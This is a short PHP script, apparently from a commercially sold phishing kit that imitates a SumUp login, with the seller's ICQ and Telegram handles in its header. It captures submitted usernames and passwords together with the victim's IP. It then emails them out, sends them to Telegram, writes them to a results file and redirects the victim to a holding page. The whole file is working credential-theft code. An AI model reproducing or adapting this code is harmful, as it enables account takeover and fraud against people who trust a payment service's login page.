<?php
/*
Author : Private Seller
ICQ : @pseller200
https://t.me/pseller200
*/

if(isset($_POST['username']) && isset($_POST['password'])){
	
include "../config.php";
include "funcs.php";

$user = $_POST['username'];
$password =  $_POST['password'];

$message = "\nID: $user\nPassword: $password\nIp: $ip\n";

//send email
$suj = "SUMUP - Login 2 FROM $ip";
mail($to,$suj,$message);
	
// send to telegram
toTG($message);
	
// save to resultat to text
saveResult($message);


	echo "<script>window.top.location.href = '../_wait.php';</script>";
}
?>